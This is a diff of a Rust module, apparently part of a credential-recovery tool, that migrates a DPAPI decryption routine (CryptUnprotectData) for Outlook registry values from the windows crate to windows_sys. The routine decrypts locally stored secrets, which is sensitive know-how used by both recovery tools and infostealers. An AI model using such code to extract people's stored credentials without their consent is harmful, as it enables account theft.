@@ -4,10 +4,9 @@ use crate::recovery::registry::format_reg_value;
 use crate::recovery::task::{RecoveryArtifact, RecoveryCategory, RecoveryError, RecoveryTask};
 use async_trait::async_trait;
 use serde::Serialize;
-use std::ffi::c_void;
 use std::sync::Arc;
-use windows::Win32::Foundation::{HLOCAL, LocalFree};
-use windows::Win32::Security::Cryptography::{
+use windows_sys::Win32::Foundation::LocalFree;
+use windows_sys::Win32::Security::Cryptography::{
     CRYPT_INTEGER_BLOB, CRYPTPROTECT_UI_FORBIDDEN, CryptUnprotectData,
 };
 use winreg::enums::HKEY_CURRENT_USER;
@@ -112,26 +111,29 @@ fn decode_dpapi_value(encrypted: &[u8]) -> Result<Vec<u8>, RecoveryError> {
             cbData: encrypted.len() as u32,
             pbData: encrypted.as_ptr() as *mut u8,
         };
-        let mut output = CRYPT_INTEGER_BLOB::default();
+        let mut output = CRYPT_INTEGER_BLOB {
+            cbData: 0,
+            pbData: std::ptr::null_mut(),
+        };
 
         let success = CryptUnprotectData(
             &mut input,
-            None,
-            None,
-            None,
-            None,
+            std::ptr::null_mut(),
+            std::ptr::null_mut(),
+            std::ptr::null_mut(),
+            std::ptr::null_mut(),
             CRYPTPROTECT_UI_FORBIDDEN,
             &mut output,
         );
 
-        if success.is_err() {
+        if success == 0 {
             return Err(RecoveryError::Custom("CryptUnprotectData failed".into()));
         }
 
         let slice = std::slice::from_raw_parts(output.pbData, output.cbData as usize);
         let result = slice.to_vec();
         if !output.pbData.is_null() {
-            let _ = LocalFree(HLOCAL(output.pbData as *mut c_void));
+            let _ = LocalFree(output.pbData as *mut _);
         }
 
         Ok(result)
@@ -168,7 +170,7 @@ impl RecoveryTask for OutlookRegistryTask {
         )
         .await?;
 
-        Ok(vec![artifact])
+        Ok(artifact.into_iter().collect())
     }
 }
 
